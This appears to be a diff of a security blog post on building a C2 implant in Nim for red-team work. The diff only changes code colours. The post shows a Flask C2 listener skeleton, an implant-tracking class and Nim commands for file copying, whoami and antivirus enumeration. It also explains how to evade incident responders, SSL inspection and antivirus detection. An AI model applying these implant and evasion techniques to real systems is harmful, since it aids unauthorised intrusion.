@@ -7,7 +7,7 @@
 <meta name=description content="Nim for offensive security For a while now I have been playing with the programming language Nim in the context of Offensive Security. Nim is a relatively young and fairly unknown programming language that has a syntax quite similar to Python&amp;rsquo;s, so is very easy to pick up. It however offers the flexibility and low-level capabilities of languages like C/C++, and has a great foreign function interface. On top of that, it compiles to native C (as well as some other languages), which results in native binaries that are quite slim.">
 <meta name=keywords content="homepage,blog,cas van cooten,security,hacking,Nim,Offensive Tooling,Hacking">
 <meta name=robots content="noodp">
-<meta name=theme-color content="#252627">
+<meta name=theme-color content>
 <link rel=canonical href=https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/>
 <title>
 Building a C2 Implant in Nim - Considerations and Lessons Learned :: Cas van Cooten — I ramble about security stuff, mostly
@@ -123,78 +123,78 @@ Building a C2 Implant in Nim - Considerations and Lessons Learned :: Cas van Coo
 <h3 id=the-c2-server>The C2 Server</h3>
 <p>Though I&rsquo;ve been raving about Nim for most of this post, I built the actual C2 server in Python. Reason for this is I&rsquo;m much more comfortable with Python overall, and it&rsquo;s quite a bit more mature as a language than Nim. Though Nim has the several advantages listed earlier in this post, these advantages are less applicable for the server component as it will not be compiled and/or deployed within the client&rsquo;s environment.</p>
 <p>For the web server, I went with Python&rsquo;s <a href=https://palletsprojects.com/p/flask/>Flask</a> framework. Flask is very easy to pick up, and makes it easy to expose endpoints with a variety of functionality. In reality there are two Flask servers running, one supporting the Nimplant listener and one supporting the GUI (see below). At a very high level, the Flask server for Nimplant listener looks like this.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#999;font-style:italic># Define a new Flask server to run in its own thread</span>
-<span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>flaskListener</span>():
-    <span style=color:orange>@app</span>.route(registerPath, methods=[<span style=color:#ed9d13>&#39;GET&#39;</span>, <span style=color:#ed9d13>&#39;POST&#39;</span>])
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>getNimplant</span>():
-        <span style=color:#999;font-style:italic># This endpoint is used for Nimplant registration.</span>
-				<span style=color:#999;font-style:italic># If a Nimplant matches expected properties, the key exchange will happen.</span>
-				<span style=color:#999;font-style:italic># After that, Nimplant will submit it&#39;s (encrypted) registration info.</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># Define a new Flask server to run in its own thread</span>
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>flaskListener</span>():
+    <span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(registerPath, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getNimplant</span>():
+        <span style=color:#75715e># This endpoint is used for Nimplant registration.</span>
+				<span style=color:#75715e># If a Nimplant matches expected properties, the key exchange will happen.</span>
+				<span style=color:#75715e># After that, Nimplant will submit it&#39;s (encrypted) registration info.</span>
 
-    <span style=color:orange>@app</span>.route(taskPath, methods=[<span style=color:#ed9d13>&#39;GET&#39;</span>])
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>getTask</span>():
-				<span style=color:#999;font-style:italic># This endpoint is used to communicate tasks to Nimplant.</span>
-				<span style=color:#999;font-style:italic># It will verify integrity, then return an encrypted task (if available).</span>
+    <span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(taskPath, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getTask</span>():
+				<span style=color:#75715e># This endpoint is used to communicate tasks to Nimplant.</span>
+				<span style=color:#75715e># It will verify integrity, then return an encrypted task (if available).</span>
 
-    <span style=color:orange>@app</span>.route(resultPath, methods=[<span style=color:#ed9d13>&#39;POST&#39;</span>])
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>getResult</span>():
-        <span style=color:#999;font-style:italic># This endpoint retrieves and parses encrypted results from Nimplant.</span>
+    <span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(resultPath, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getResult</span>():
+        <span style=color:#75715e># This endpoint retrieves and parses encrypted results from Nimplant.</span>
 
-    app.run(host=listenerIp, port=listenerPort)
+    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span>listenerIp, port<span style=color:#f92672>=</span>listenerPort)
 </code></pre></div><p>You will notice that the actual addresses of endpoints (e.g. <code>www.yourc2.com/register</code>), as well as the server IP and port, are configurable. These properties are parsed from the <code>config.toml</code> file, which is shared between a C2 server and its Nimplants. Because this configuration file is shared, it allows the server to perform integrity checks based on the properties of incoming web requests, such as the User-Agent or HTTP headers. Unexpected requests are dropped, making it harder for incident responders to actually interact with the C2 server.</p>
 <p>Special attention should be paid to the initial key exchange, which happens when a Nimplant first checks in. Since every Nimplant has a unique encryption key associated with it, the server shares this key as part of the <code>getNimplant()</code> function. We don&rsquo;t want to transmit this key in plain-text, even if HTTPS is used. This is because we operate under the assumption that our client has insight into their network traffic by means of a web proxy or similar device that allows for SSL inspection (which is true for most mature clients). As such, the initial key exchange itself is encrypted with a key that is established when the Nimplant is first generated. After this exchange, Nimplant will use its unique key to AES-encrypt all subsequent traffic.</p>
 <p>The C2 server will keep track of Nimplants through the use of classes - every Nimplant corresponds to one instance of the <code>Nimplant</code> class, which has a variety of properties for Nimplant. A snippet of the class, along with some of its helper functions, is as follows.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>class</span> <span style=color:#447fcf;text-decoration:underline>NimPlant</span>:
-		<span style=color:#999;font-style:italic># Initialize a new Nimplant object, use data from config where applicable</span>
-    newId = itertools.count(start=<span style=color:#3677a9>1</span>)
-    <span style=color:#6ab825;font-weight:700>def</span> __init__(self):
-        self.id = <span style=color:#24909d>str</span>(<span style=color:#24909d>next</span>(self.newId))
-        self.guid = <span style=color:#ed9d13>&#39;&#39;</span>.join(random.choice(string.ascii_letters + string.digits) <span style=color:#6ab825;font-weight:700>for</span> i <span style=color:#6ab825;font-weight:700>in</span> <span style=color:#24909d>range</span>(<span style=color:#3677a9>8</span>))
-        self.active = <span style=color:#6ab825;font-weight:700>False</span>
-        self.ipAddrExt = <span style=color:#6ab825;font-weight:700>None</span>
-        self.ipAddrInt = <span style=color:#6ab825;font-weight:700>None</span>
-        self.username = <span style=color:#6ab825;font-weight:700>None</span>
-        self.hostname = <span style=color:#6ab825;font-weight:700>None</span>
-        self.osBuild = <span style=color:#6ab825;font-weight:700>None</span>
-        self.pid = <span style=color:#6ab825;font-weight:700>None</span>
-        self.sleepTimeSeconds = sleepTimeSeconds
-        self.killTimeHours = killTimeHours
-        self.firstCheckin = <span style=color:#6ab825;font-weight:700>None</span>
-        self.lastCheckin = <span style=color:#6ab825;font-weight:700>None</span>
-        self.task = <span style=color:#6ab825;font-weight:700>None</span>
-        self.hostingFile = <span style=color:#6ab825;font-weight:700>None</span>
-        self.cryptKey = <span style=color:#999;font-style:italic># secret sauce omitted 👀</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>NimPlant</span>:
+		<span style=color:#75715e># Initialize a new Nimplant object, use data from config where applicable</span>
+    newId <span style=color:#f92672>=</span> itertools<span style=color:#f92672>.</span>count(start<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)
+    <span style=color:#66d9ef>def</span> __init__(self):
+        self<span style=color:#f92672>.</span>id <span style=color:#f92672>=</span> str(next(self<span style=color:#f92672>.</span>newId))
+        self<span style=color:#f92672>.</span>guid <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(random<span style=color:#f92672>.</span>choice(string<span style=color:#f92672>.</span>ascii_letters <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>8</span>))
+        self<span style=color:#f92672>.</span>active <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+        self<span style=color:#f92672>.</span>ipAddrExt <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+        self<span style=color:#f92672>.</span>ipAddrInt <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+        self<span style=color:#f92672>.</span>username <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+        self<span style=color:#f92672>.</span>hostname <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+        self<span style=color:#f92672>.</span>osBuild <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+        self<span style=color:#f92672>.</span>pid <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+        self<span style=color:#f92672>.</span>sleepTimeSeconds <span style=color:#f92672>=</span> sleepTimeSeconds
+        self<span style=color:#f92672>.</span>killTimeHours <span style=color:#f92672>=</span> killTimeHours
+        self<span style=color:#f92672>.</span>firstCheckin <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+        self<span style=color:#f92672>.</span>lastCheckin <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+        self<span style=color:#f92672>.</span>task <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+        self<span style=color:#f92672>.</span>hostingFile <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+        self<span style=color:#f92672>.</span>cryptKey <span style=color:#f92672>=</span> <span style=color:#75715e># secret sauce omitted 👀</span>
 
-		<span style=color:#999;font-style:italic># Populate the Nimplant object with information based on first check-in</span>
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>activate</span>(self, ipAddrExt, ipAddrInt, username, hostname, osBuild, pid):
-        self.active = <span style=color:#6ab825;font-weight:700>True</span>
-        self.ipAddrExt = ipAddrExt
-        self.ipAddrInt = ipAddrInt
-        self.username = username
-        self.hostname = hostname
-        self.osBuild = osBuild
-        self.pid = pid
-        self.firstCheckin = timestamp()
-        self.lastCheckin = timestamp()
-				<span style=color:#999;font-style:italic># &#39;nimplantPrint&#39; is a custom function to properly direct output to console or a Nimplant&#39;s log</span>
-        nimplantPrint(<span style=color:#ed9d13>f</span><span style=color:#ed9d13>&#34;NimPlant #</span><span style=color:#ed9d13>{</span>self.id<span style=color:#ed9d13>}</span><span style=color:#ed9d13> (</span><span style=color:#ed9d13>{</span>self.guid<span style=color:#ed9d13>}</span><span style=color:#ed9d13>) checked in from </span><span style=color:#ed9d13>{</span>username<span style=color:#ed9d13>}</span><span style=color:#ed9d13>@</span><span style=color:#ed9d13>{</span>hostname<span style=color:#ed9d13>}</span><span style=color:#ed9d13> at &#39;</span><span style=color:#ed9d13>{</span>ipAddrExt<span style=color:#ed9d13>}</span><span style=color:#ed9d13>&#39;!&#34;</span>)
-        nimplantPrint(<span style=color:#ed9d13>f</span><span style=color:#ed9d13>&#34;OS version is </span><span style=color:#ed9d13>{</span>osBuild<span style=color:#ed9d13>}</span><span style=color:#ed9d13>.&#34;</span>)
+		<span style=color:#75715e># Populate the Nimplant object with information based on first check-in</span>
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>activate</span>(self, ipAddrExt, ipAddrInt, username, hostname, osBuild, pid):
+        self<span style=color:#f92672>.</span>active <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+        self<span style=color:#f92672>.</span>ipAddrExt <span style=color:#f92672>=</span> ipAddrExt
+        self<span style=color:#f92672>.</span>ipAddrInt <span style=color:#f92672>=</span> ipAddrInt
+        self<span style=color:#f92672>.</span>username <span style=color:#f92672>=</span> username
+        self<span style=color:#f92672>.</span>hostname <span style=color:#f92672>=</span> hostname
+        self<span style=color:#f92672>.</span>osBuild <span style=color:#f92672>=</span> osBuild
+        self<span style=color:#f92672>.</span>pid <span style=color:#f92672>=</span> pid
+        self<span style=color:#f92672>.</span>firstCheckin <span style=color:#f92672>=</span> timestamp()
+        self<span style=color:#f92672>.</span>lastCheckin <span style=color:#f92672>=</span> timestamp()
+				<span style=color:#75715e># &#39;nimplantPrint&#39; is a custom function to properly direct output to console or a Nimplant&#39;s log</span>
+        nimplantPrint(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;NimPlant #</span><span style=color:#e6db74>{</span>self<span style=color:#f92672>.</span>id<span style=color:#e6db74>}</span><span style=color:#e6db74> (</span><span style=color:#e6db74>{</span>self<span style=color:#f92672>.</span>guid<span style=color:#e6db74>}</span><span style=color:#e6db74>) checked in from </span><span style=color:#e6db74>{</span>username<span style=color:#e6db74>}</span><span style=color:#e6db74>@</span><span style=color:#e6db74>{</span>hostname<span style=color:#e6db74>}</span><span style=color:#e6db74> at &#39;</span><span style=color:#e6db74>{</span>ipAddrExt<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;!&#34;</span>)
+        nimplantPrint(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;OS version is </span><span style=color:#e6db74>{</span>osBuild<span style=color:#e6db74>}</span><span style=color:#e6db74>.&#34;</span>)
 
-		<span style=color:#999;font-style:italic># Process a &#39;regular&#39; Nimplant check-in</span>
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>checkIn</span>(self):
-        self.lastCheckin = timestamp()
-        <span style=color:#6ab825;font-weight:700>if</span> self.task <span style=color:#6ab825;font-weight:700>is</span> <span style=color:#6ab825;font-weight:700>not</span> <span style=color:#6ab825;font-weight:700>None</span>:
-            <span style=color:#6ab825;font-weight:700>if</span> self.task == <span style=color:#ed9d13>&#34;kill&#34;</span>:
-                self.active = <span style=color:#6ab825;font-weight:700>False</span>
-                nimplantPrint(<span style=color:#ed9d13>f</span><span style=color:#ed9d13>&#34;Nimplant #</span><span style=color:#ed9d13>{</span>self.id<span style=color:#ed9d13>}</span><span style=color:#ed9d13> killed.&#34;</span>, self.guid)
+		<span style=color:#75715e># Process a &#39;regular&#39; Nimplant check-in</span>
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>checkIn</span>(self):
+        self<span style=color:#f92672>.</span>lastCheckin <span style=color:#f92672>=</span> timestamp()
+        <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>task <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
+            <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>task <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;kill&#34;</span>:
+                self<span style=color:#f92672>.</span>active <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+                nimplantPrint(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Nimplant #</span><span style=color:#e6db74>{</span>self<span style=color:#f92672>.</span>id<span style=color:#e6db74>}</span><span style=color:#e6db74> killed.&#34;</span>, self<span style=color:#f92672>.</span>guid)
 
-		<span style=color:#999;font-style:italic># Process the result for a certain Nimplant</span>
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>setResult</span>(self, result):
-        <span style=color:#6ab825;font-weight:700>if</span> result == <span style=color:#ed9d13>&#34;NIMPLANT_KILL_TIMER_EXPIRED&#34;</span>:
-            self.active = <span style=color:#6ab825;font-weight:700>False</span>
-            nimplantPrint(<span style=color:#ed9d13>&#34;Nimplant announced self-destruct (kill timer expired). RIP.&#34;</span>, self.guid)
-        <span style=color:#6ab825;font-weight:700>else</span>:
-            nimplantPrint(result, self.guid)
+		<span style=color:#75715e># Process the result for a certain Nimplant</span>
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>setResult</span>(self, result):
+        <span style=color:#66d9ef>if</span> result <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;NIMPLANT_KILL_TIMER_EXPIRED&#34;</span>:
+            self<span style=color:#f92672>.</span>active <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+            nimplantPrint(<span style=color:#e6db74>&#34;Nimplant announced self-destruct (kill timer expired). RIP.&#34;</span>, self<span style=color:#f92672>.</span>guid)
+        <span style=color:#66d9ef>else</span>:
+            nimplantPrint(result, self<span style=color:#f92672>.</span>guid)
 </code></pre></div><p>As you can see, most information about a Nimplant is populated through the <code>activate()</code> function which is triggered on first check-in. There are some checks in the various functions, which for example take care of killing a Nimplant when either the <code>exit</code> or <code>kill</code> commands are provided or the Nimplant&rsquo;s self-destruct timer expired. To keep track of the various Nimplants that have checked in as well as their respective statuses, there is also a <code>NimplantList</code> class available.</p>
 <p>Information from both of these classes is made accessible by an internal API. This API supports both the command-line interface (CLI) and the graphical user interface (GUI), discussed below. Because I focused only on the CLI when I started developing, it was quite a hassle to modify the codebase to support a generic API at a later point. If you&rsquo;re starting a project like this, don&rsquo;t make the mistake that I made: <strong>focus on writing modular and extensible code right from the start!</strong> It may take some more effort, but it will pay out in the long run.</p>
 <p>It goes without saying that the server handles quite a bit more functionality, such as parsing commands, file uploads, cryptographic operations, and logging all executed commands and the resulting output. It is beyond the scope of this blog post to discuss all of that functionality here.</p>
@@ -210,85 +210,85 @@ Building a C2 Implant in Nim - Considerations and Lessons Learned :: Cas van Coo
 <p><strong>File operations</strong></p>
 <p>File operations consist of a variety of commands, based on their Linux counterparts. The commands related to file operations in Nimplant include <code>cat</code>, <code>cd</code>, <code>cp</code>, <code>ls</code>, <code>mkdir</code>, <code>mv</code>, <code>pwd</code>, and <code>rm</code>. The implementation of these actually isn&rsquo;t all too interesting, since most functionality is wrapped by Nim&rsquo;s <a href=https://nim-lang.org/docs/os.html>os</a> library.</p>
 <p>The biggest challenge I encountered for (some) of these commands was argument parsing. Take for instance the <code>cp</code> command, which copies a file from one place to another. In principle this is a straight-forward task. However, the command takes a source and destination parameter, the source can be both a file and a folder, and the destination can be both a partial destination (parent folder), or the new file/folder name. The function then becomes something like the following.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>os</span> <span style=color:#6ab825;font-weight:700>import</span> copyDir, copyFile, copyFileToDir, dirExists, splitPath, <span style=color:#a61717;background-color:#e3d2d2>`</span>/<span style=color:#a61717;background-color:#e3d2d2>`</span>
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> join
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> os <span style=color:#f92672>import</span> copyDir, copyFile, copyFileToDir, dirExists, splitPath, <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>/</span><span style=color:#960050;background-color:#1e0010>`</span>
+<span style=color:#f92672>from</span> strutils <span style=color:#f92672>import</span> join
 
-<span style=color:#999;font-style:italic># Copy files or directories</span>
-proc cp*(args : varargs[string]) : string =
+<span style=color:#75715e># Copy files or directories</span>
+proc cp<span style=color:#f92672>*</span>(args : varargs[string]) : string <span style=color:#f92672>=</span>
     var
         source : string
         destination : string
 
-		<span style=color:#999;font-style:italic># Parse expected number of arguments (2 or more)</span>
-    <span style=color:#6ab825;font-weight:700>if</span> args.len &gt;= <span style=color:#3677a9>2</span>:
-        source = args[<span style=color:#3677a9>0</span>]
-				<span style=color:#999;font-style:italic># If &gt;2 arguments are given, join them as the second argument</span>
-				<span style=color:#999;font-style:italic># This happens for e.g. an unquoted path with spaces</span>
-        destination = args[<span style=color:#3677a9>1</span> .. ^<span style=color:#3677a9>1</span>].join(<span style=color:#ed9d13>&#34; &#34;</span>)
-    <span style=color:#6ab825;font-weight:700>else</span>:
-				<span style=color:#999;font-style:italic># Error out if too few arguments are provided</span>
-        result = <span style=color:#ed9d13>&#34;Invalid number of arguments received. Usage: &#39;cp [source] [destination]&#39;.&#34;</span>
-        <span style=color:#6ab825;font-weight:700>return</span>
+		<span style=color:#75715e># Parse expected number of arguments (2 or more)</span>
+    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>len <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>2</span>:
+        source <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>0</span>]
+				<span style=color:#75715e># If &gt;2 arguments are given, join them as the second argument</span>
+				<span style=color:#75715e># This happens for e.g. an unquoted path with spaces</span>
+        destination <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>1</span> <span style=color:#f92672>..</span> <span style=color:#f92672>^</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>join(<span style=color:#e6db74>&#34; &#34;</span>)
+    <span style=color:#66d9ef>else</span>:
+				<span style=color:#75715e># Error out if too few arguments are provided</span>
+        result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Invalid number of arguments received. Usage: &#39;cp [source] [destination]&#39;.&#34;</span>
+        <span style=color:#66d9ef>return</span>
 
-    <span style=color:#999;font-style:italic># Copying a directory</span>
-    <span style=color:#6ab825;font-weight:700>if</span> dirExists(source):
-        <span style=color:#6ab825;font-weight:700>if</span> dirExists(destination):
-						<span style=color:#999;font-style:italic># Copy the directory into the existing directory as its current name</span>
-            copyDir(source, destination/splitPath(source).tail)
-        <span style=color:#6ab825;font-weight:700>else</span>:
-						<span style=color:#999;font-style:italic># Copy the file as the provided directory name</span>
+    <span style=color:#75715e># Copying a directory</span>
+    <span style=color:#66d9ef>if</span> dirExists(source):
+        <span style=color:#66d9ef>if</span> dirExists(destination):
+						<span style=color:#75715e># Copy the directory into the existing directory as its current name</span>
+            copyDir(source, destination<span style=color:#f92672>/</span>splitPath(source)<span style=color:#f92672>.</span>tail)
+        <span style=color:#66d9ef>else</span>:
+						<span style=color:#75715e># Copy the file as the provided directory name</span>
             copyDir(source, destination)
 
-    <span style=color:#999;font-style:italic># Copying a file</span>
-    <span style=color:#6ab825;font-weight:700>elif</span> dirExists(destination):
-				<span style=color:#999;font-style:italic># Copy the file into the existing directory as its current name</span>
+    <span style=color:#75715e># Copying a file</span>
+    <span style=color:#66d9ef>elif</span> dirExists(destination):
+				<span style=color:#75715e># Copy the file into the existing directory as its current name</span>
         copyFileToDir(source, destination)
-    <span style=color:#6ab825;font-weight:700>else</span>:
-				<span style=color:#999;font-style:italic># Copy the file as the provided filename</span>
+    <span style=color:#66d9ef>else</span>:
+				<span style=color:#75715e># Copy the file as the provided filename</span>
         copyFile(source, destination)
     
-		<span style=color:#999;font-style:italic># Setting &#39;result&#39; will make the function return with that result in Nim</span>
-    result = <span style=color:#ed9d13>&#34;Copied &#39;&#34;</span> &amp; source &amp; <span style=color:#ed9d13>&#34;&#39; to &#39;&#34;</span> &amp; destination &amp; <span style=color:#ed9d13>&#34;&#39;.&#34;</span>
+		<span style=color:#75715e># Setting &#39;result&#39; will make the function return with that result in Nim</span>
+    result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Copied &#39;&#34;</span> <span style=color:#f92672>&amp;</span> source <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;&#39; to &#39;&#34;</span> <span style=color:#f92672>&amp;</span> destination <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;&#39;.&#34;</span>
 </code></pre></div><p>Note the use of <a href=https://nim-by-example.github.io/varargs/>varargs</a> in the function parameters. This type allows us to receive one to many commands from the C2 server inside of an array, This allows us to parse commands and deal with possible exceptions inside the function itself.</p>
 <p><strong>&lsquo;Whoami&rsquo; command</strong></p>
 <p>While not too interesting on itself, the <code>whoami</code> command provides a nice use case of using benign Windows APIs to achieve your goals. Nimplant&rsquo;s implementation, quite simply, uses the <a href=https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea>GetUserName</a> API to retrieve the user&rsquo;s name.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>winim</span>/lean <span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>GetUserName</span>, <span style=color:#447fcf;text-decoration:underline>LPWSTR</span>, <span style=color:#447fcf;text-decoration:underline>DWORD</span>, <span style=color:#447fcf;text-decoration:underline>TCHAR</span>
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>winim</span>/utils <span style=color:#6ab825;font-weight:700>import</span> <span style=color:#a61717;background-color:#e3d2d2>`</span>&amp;<span style=color:#a61717;background-color:#e3d2d2>`</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> winim<span style=color:#f92672>/</span>lean <span style=color:#f92672>import</span> GetUserName<span style=color:#f92672>,</span> LPWSTR<span style=color:#f92672>,</span> DWORD<span style=color:#f92672>,</span> TCHAR
+<span style=color:#f92672>from</span> winim<span style=color:#f92672>/</span>utils <span style=color:#f92672>import</span> <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>&amp;</span><span style=color:#960050;background-color:#1e0010>`</span>
 
-<span style=color:#999;font-style:italic># Get the current username via the GetUserName API</span>
-proc whoami*() : string =
+<span style=color:#75715e># Get the current username via the GetUserName API</span>
+proc whoami<span style=color:#f92672>*</span>() : string <span style=color:#f92672>=</span>
     var 
-        buf : array[<span style=color:#3677a9>257</span>, TCHAR] <span style=color:#999;font-style:italic># 257 is UNLEN+1 (max username length plus null terminator)</span>
-        lpBuf :  LPWSTR = addr buf[<span style=color:#3677a9>0</span>]
-        pcbBuf : DWORD = int32(<span style=color:#24909d>len</span>(buf))
+        buf : array[<span style=color:#ae81ff>257</span>, TCHAR] <span style=color:#75715e># 257 is UNLEN+1 (max username length plus null terminator)</span>
+        lpBuf :  LPWSTR <span style=color:#f92672>=</span> addr buf[<span style=color:#ae81ff>0</span>]
+        pcbBuf : DWORD <span style=color:#f92672>=</span> int32(len(buf))
 
-		<span style=color:#999;font-style:italic># The actual API call</span>
-    discard GetUserName(lpBuf, &amp;pcbBuf)
+		<span style=color:#75715e># The actual API call</span>
+    discard GetUserName(lpBuf, <span style=color:#f92672>&amp;</span>pcbBuf)
 
-		<span style=color:#999;font-style:italic># Read the buffer into the function result</span>
-    <span style=color:#6ab825;font-weight:700>for</span> character <span style=color:#6ab825;font-weight:700>in</span> buf:
-        <span style=color:#6ab825;font-weight:700>if</span> character == <span style=color:#3677a9>0</span>: <span style=color:#6ab825;font-weight:700>break</span>
-        result.add(char(character))
+		<span style=color:#75715e># Read the buffer into the function result</span>
+    <span style=color:#66d9ef>for</span> character <span style=color:#f92672>in</span> buf:
+        <span style=color:#66d9ef>if</span> character <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>: <span style=color:#66d9ef>break</span>
+        result<span style=color:#f92672>.</span>add(char(character))
 </code></pre></div><p><a href=https://github.com/khchen/winim>Winim</a> is used to ease the pain of manually defining the right structures and importing the right functions from the Windows API. However, there is one important note to make here regarding OPSEC: Importing full modules from libraries like <code>winim</code> makes it so that your binary becomes bloated with unnecessary function import statements - including imports that can be considered malicious by antivirus. I found that specifically selecting your imports (as shown above) helps reduce the fingerprint of your binary, while increasing overall evasion.</p>
 <p><strong>&lsquo;GetAV&rsquo; command</strong></p>
 <p>The <code>GetAV</code> command is an example of a convenience command I added for operators to more quickly gain a lay of the land once they get a callback from a machine. It&rsquo;s almost equivalent to byt3bl33der&rsquo;s <a href=https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/wmiquery_bin.nim>wmiquery_bin</a> example from OffensiveNim, except it parses the output a bit different. It also serves as a nice example of how easy it is to &lsquo;plug in&rsquo; new commands once you have the base structure of parsing input and output down.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>winim</span>/com
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> strip
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> winim<span style=color:#f92672>/</span>com
+<span style=color:#f92672>from</span> strutils <span style=color:#f92672>import</span> strip
 
-<span style=color:#999;font-style:italic># Get antivirus products on the machine via WMI</span>
-proc getAv*() : string =
-    let wmisec = GetObject(<span style=color:#ed9d13>r</span><span style=color:#ed9d13>&#34;winmgmts:{impersonationLevel=impersonate}!</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>.\root\securitycenter2&#34;</span>)
-    <span style=color:#6ab825;font-weight:700>for</span> avprod <span style=color:#6ab825;font-weight:700>in</span> wmisec.execQuery(<span style=color:#ed9d13>&#34;SELECT displayName FROM AntiVirusProduct</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>):
